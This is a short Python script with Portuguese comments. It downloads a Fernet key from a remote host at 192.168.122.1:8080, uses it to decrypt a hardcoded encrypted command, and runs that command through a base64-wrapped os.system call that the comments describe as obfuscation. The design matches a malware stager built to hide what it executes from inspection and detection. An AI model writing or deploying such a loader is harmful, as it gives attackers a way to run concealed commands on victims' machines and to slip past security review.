import requests
from cryptography.fernet import Fernet
import subprocess
import base64
import binascii

# Função para ofuscar a execução do comando
def obfuscated_run(command):
    # Codifica o comando em base64 para ofuscação
    encoded_cmd = base64.b64encode(command.encode()).decode()
    # Usa um comando Python indireto para decodificar e executar
    exec_cmd = f"import base64, os; os.system(base64.b64decode('{encoded_cmd}').decode())"
    return subprocess.run(['python', '-c', exec_cmd], capture_output=True, text=True)

def main():
    try:
        # URL do arquivo txt contendo a chave Fernet
        txt_url = "https://192.168.122.1:8080/Chave/chave_fernet.txt"
        # Faz a requisição para obter o arquivo txt
        response = requests.get(txt_url)
        response.raise_for_status()
        # Extrai a chave do conteúdo do arquivo
        fernet_key = response.text.strip().encode()
        
        # Valida a chave Fernet
        try:
            fernet = Fernet(fernet_key)
        except (ValueError, binascii.Error):
            print("Chave Fernet inválida")
            return
        
        # Comando criptografado fixo
        encrypted_command = "gAAAAABoKNpusGxbnt_Nbe78HT9y6Haje0GVwDN3nLJZmYP_AgJBnXimUgzQ3CAZmT9qKyo9isbaSsjbVtef-lCFnNbbaMYyDsoaXekVzmvoXbgLaBBfaTi0ySHabl0KRPunANHtRfFqRG-E8-RfIRhI-vyH0ZBXa3nW6ufPLQdbkdorih_oG26ARqM7Q5LEhanbZC0Ih61cly2bGGi5Bj2H9-PKlxr26rq4DAlLQX2qdOjU3071MSBP_ekd1KZVVUZa055ao8Vti-UJbuYzqKk6JCrl4I0_mbJ9sbj3YoVn3vWmC2wk87RNVVJP42zaZSUWOr2ZAfH_hsWjteQSqXSDkelnKl1h2XmK6DOowDk8UEKHD70-yyO5UxP2vncV3-6Y2rV5WZTGaWNi2qvjzxpPG6uD-iC6BXTDjYT-krrp2jhiK_dC76oqDVHjIEObmPbADp1c5q0IpUqSxKyPdq5dTt8zhOw6bMnxhitxZ9IwbL0K8ovqTBqxY8qzWhvdER-Y1WPeHgH9YOOlZbvccFQiHTRD0wmEWZsr_6nKG11yn6dsA0ubI_hHYaAihFxVkyjXGmb-wp7slT8iehFKDvq7eNky5nmcHIYuFcn1YLooAlC4bzBS_mEc8e0afIZub3WWFP8-g_RKZw422QigPAYVCJBHgrAXmQJ107L7KCMn6ytcYUqbMjcEe5LCX5XX19Z-PKGULW3y2LaPRS_0AEjZqkHfRhfCV98y7p23CV2hIJBKSWZbnZ7GW-3SAbVyizw6sRIujdo3caCSMfQ4zoyWEaTp3ETgBe6boZsSj9qVO932tpcRfIdaAIkDHAdeLoGIjDe2-WeO"
        
        # Verifica se o comando criptografado foi fornecido
        if not encrypted_command:
            print("Nenhum comando criptografado fornecido")
            return
        
        # Descriptografa o comando
        decrypted_command = fernet.decrypt(encrypted_command).decode()
        
        # Executa o comando de forma ofuscada
        result = obfuscated_run(decrypted_command)
        
        # Exibe a saída do comando
        print("Saída do comando:", result.stdout)
        if result.stderr:
            print("Erro:", result.stderr)
            
    except requests.RequestException as e:
        print(f"Erro ao baixar o arquivo: {e}")
    except Exception as e:
        print(f"Erro durante a execução: {e}")

if __name__ == "__main__":
    main()
